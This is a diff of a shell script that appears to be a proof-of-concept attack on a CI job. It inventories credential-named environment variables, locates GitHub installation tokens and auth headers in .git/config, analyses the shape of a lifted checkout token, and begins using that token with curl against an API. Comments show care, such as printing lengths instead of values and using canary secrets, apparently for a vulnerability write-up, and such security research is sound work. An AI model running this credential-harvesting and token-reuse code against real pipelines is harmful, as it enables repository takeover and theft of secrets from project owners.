@@ -49,13 +49,27 @@ inv() {
   inv JOB_ENV_CANARY              "${JOB_ENV_CANARY-}"
   inv CANARY_DEMO_SECRET          "${CANARY_DEMO_SECRET-}"
   inv RCE_CANARY_ENV              "${RCE_CANARY_ENV-}"
-  echo "--- other env keys that look secret-bearing ---"
-  env | sed -n 's/^\([A-Z0-9_]*\(TOKEN\|KEY\|SECRET\|PASSWORD\|CREDENTIAL\)[A-Z0-9_]*\)=.*/\1/p' | sort -u
+  echo "--- every credential-named variable in the job env (name, length only) ---"
+  # lengths only here, deliberately: third-party credential names may hold real
+  # values in a real deployment, and a published digest would enable offline
+  # verification of a guessed secret. Lengths are sufficient to prove the value
+  # reached attacker code unscrubbed; digests are published only for the
+  # GitHub-issued tokens and the canary values that are under test.
+  env | sed -n 's/^\([A-Z0-9_]*\(TOKEN\|KEY\|SECRET\|PASSWORD\|CREDENTIAL\|AWS\|GOOGLE\)[A-Z0-9_]*\)=.*/\1/p' | sort -u | while read -r n; do
+    v="$(printenv "$n" 2>/dev/null || true)"
+    if [ -n "$v" ]; then printf '%-40s len=%-5s VALUE_PRESENT\n' "$n" "${#v}"; else printf '%-40s (empty)\n' "$n"; fi
+  done
   echo "ACTIONS_ID_TOKEN_REQUEST_URL_set=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL-}" ] && echo yes || echo no)"
   echo "--- token material in the checkout ---"
   echo "gitconfig_bytes=$(wc -c < .git/config 2>/dev/null)"
-  echo "ghs_like_occurrences=$(grep -c -o 'ghs_[A-Za-z0-9]\{20,\}' .git/config 2>/dev/null)"
+  echo "gitconfig_lines=$(wc -l < .git/config 2>/dev/null)"
+  echo "x_accesstoken_lines=$(grep -c 'x-access-token' .git/config 2>/dev/null)"
+  echo "ghs_count_ge10=$(grep -o 'ghs_[A-Za-z0-9]\{10,\}' .git/config 2>/dev/null | wc -l)"
+  echo "ghs_count_ge20=$(grep -o 'ghs_[A-Za-z0-9]\{20,\}' .git/config 2>/dev/null | wc -l)"
   echo "extraheader_occurrences=$(grep -c extraheader .git/config 2>/dev/null)"
+  echo "per_line_lengths=$(awk '{printf \"%d,\", length($0)}' .git/config 2>/dev/null)"
+  echo "--- structural view of .git/config (every run of 8+ [A-Za-z0-9_-] collapsed to <RUN>) ---"
+  sed -E 's/[A-Za-z0-9_-]{8,}/<RUN>/g' .git/config 2>/dev/null
 } > rce_secrets.txt 2>&1
 
 # -------------------------------------- 3. lift the checkout credential and USE it
@@ -69,6 +83,13 @@ rc_repo=0; rc_inst=0; rc_post=0; rc_put=0
 {
   echo "lifted_from=${SRC}"
   echo "lifted_token_len=${#TOK} sha256_16=$(sha "$TOK") prefix4=${TOK:0:4}"
+  # Why 377? describe the material's shape without printing it: this separates a
+  # genuine 40-char installation token from a longer composite the sed may have
+  # captured, so the write-up does not overstate what was lifted.
+  echo "lifted_token_alnum_only_len=$(printf '%s' "$TOK" | tr -cd 'A-Za-z0-9' | wc -c)"
+  echo "lifted_token_non_alnum_chars=$(printf '%s' "$TOK" | tr -d 'A-Za-z0-9' | od -An -c | tr -s ' ' | tr -d '\n')"
+  echo "lifted_token_run_shape=$(printf '%s' "$TOK" | sed -E 's/[A-Za-z0-9]+/A/g; s/[^A]/X/g' | fold -w1 | uniq -c | awk '{printf \"%sx%s \", $1, $2}')"
+  echo "lifted_token_has_at=$(printf '%s' "$TOK" | tr -dc '@' | wc -c)"
   [ "$TOK" = "${GITHUB_TOKEN-}" ] && echo "same_value_as_env_GITHUB_TOKEN=yes" || echo "same_value_as_env_GITHUB_TOKEN=no"
 
   rc_repo=$(curl -sS -o ident.json -D hdr_ident.txt -w '%{http_code}' -H "$HDR" \
